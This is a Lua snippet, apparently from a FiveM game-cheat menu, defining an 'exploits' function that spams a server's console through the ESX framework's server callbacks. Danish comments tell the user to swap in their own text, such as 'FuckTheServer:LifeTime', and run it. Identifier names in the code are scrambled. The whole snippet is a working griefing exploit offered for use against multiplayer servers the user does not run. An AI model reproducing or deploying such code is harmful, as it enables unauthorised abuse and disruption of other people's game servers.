NertigelFunc.exploits.esx_spam_server_console = function()
    if ESX ~= nil then
        for i = 4, 9 do
            ESX.TriggerServerCallback(
                "^" .. i .. "Skrive:her", -- Skrive din text der hvor der står FuckTheServer:LifeTime du må ikke slette : skrive inde for "" og så executer du den                                                      
                function(xW4qzWy)                     --Bare.
                end
            )
        end
    else
        RPPPwdjwdU23.PushNotification("ESX was not found!", 5000)
    end
end